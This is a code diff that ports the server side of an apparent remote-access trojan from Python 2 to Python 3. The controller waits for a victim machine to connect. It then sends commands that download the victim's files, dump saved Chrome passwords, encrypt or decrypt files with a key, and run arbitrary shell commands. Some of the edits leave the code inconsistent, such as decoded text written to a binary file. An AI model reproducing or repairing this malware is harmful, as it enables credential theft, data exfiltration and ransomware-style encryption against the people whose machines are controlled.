@@ -1,4 +1,3 @@
-#!/usr/bin/python
 import socket
 import os
 import sys
@@ -25,7 +24,7 @@ class ExploitAdministration(setConfig):
 			print("\n[*] Listening connection as server {}:{} ...".format(self.LHOST, self.LPORT))
 			self.received, self.fromAddress = self.exploit.accept()
 			print("[*] Connection estabilished with {h}:{p}".format(h=self.fromAddress[0], p=str(self.fromAddress[1])))
-			self.systemOS = self.received.recv(1024)
+			self.systemOS = self.received.recv(1024).decode()
 			time.sleep(1)
 			print("[*] Running on system target -> {system}".format(system=self.systemOS))
 			print(
@@ -45,12 +44,12 @@ class ExploitAdministration(setConfig):
 						try:
 							print("\n[+] Downloading file ...")
 							file_name = shell.split()[1]
-							self.received.send(shell)
+							self.received.send(shell.encode('utf-8'))
 							with open(file_name, "wb") as fn:
-								read_data = self.received.recv(1024)
+								read_data = self.received.recv(1024).decode()
 								while True:
 									fn.write(read_data)
-									read_data = self.received.recv(1024)
+									read_data = self.received.recv(1024).decode()
 									if read_data == "DONE":
 										break
 							print("[+] Downloaded to complete.")
@@ -60,8 +59,8 @@ class ExploitAdministration(setConfig):
 					elif shell == "dump_chrome":
 						print("\n[+] Dumping password on chrome target ...")
 						time.sleep(2)
-						self.received.send("dump_chrome")
-						self.data_dump = self.received.recv(4096)
+						self.received.send("dump_chrome".encode('utf-8'))
+						self.data_dump = self.received.recv(4096).decode()
 						with open("dump_chrome.txt", "w") as filepassword:
 							filepassword.write(self.data_dump)
 							filepassword.close()
@@ -72,7 +71,7 @@ class ExploitAdministration(setConfig):
 							fileTarget = shell.split()[1]
 							key = shell.split()[2]
 							print("\n[+] Encrypting file -> {}".format(fileTarget))
-							self.received.send("encrypt {} {}".format(fileTarget, key))
+							self.received.send("encrypt {} {}".format(fileTarget, key).encode('utf-8'))
 							print("[+] Encrypted successfully!\n")
 						except IndexError:
 							print("Usage: encrypt [file] [key]") 
@@ -82,14 +81,14 @@ class ExploitAdministration(setConfig):
 							fileTargets = shell.split()[1]
 							keys = shell.split()[2]
 							print("\n[+] Decrypting file -> {}".format(fileTargets))
-							self.received.send("decrypt {} {}".format(fileTargets, keys))
+							self.received.send("decrypt {} {}".format(fileTargets, keys).encode('utf-8'))
 							print("[+] Decrypted successfully!\n")
 						except IndexError:
 							print("Usage: decrypt [file] [key]")
 
 					elif shell == "quit":
 						self.received.send("quit")
-						respon = self.received.recv(4096)
+						respon = self.received.recv(4096).decode()
 						print("\n[!] {data_response}".format(data_response=respon))
 						self.received.close()
 
@@ -97,8 +96,8 @@ class ExploitAdministration(setConfig):
 						print("\n[!] No send commands to exploit!!\n")
 
 					else:
-						self.received.send(shell)
-						self.data_receive = self.received.recv(4096)
+						self.received.send(shell.encode('utf-8'))
+						self.data_receive = self.received.recv(4096).decode()
 						print(str(self.data_receive))
 				except KeyboardInterrupt:
 					self.received.close()
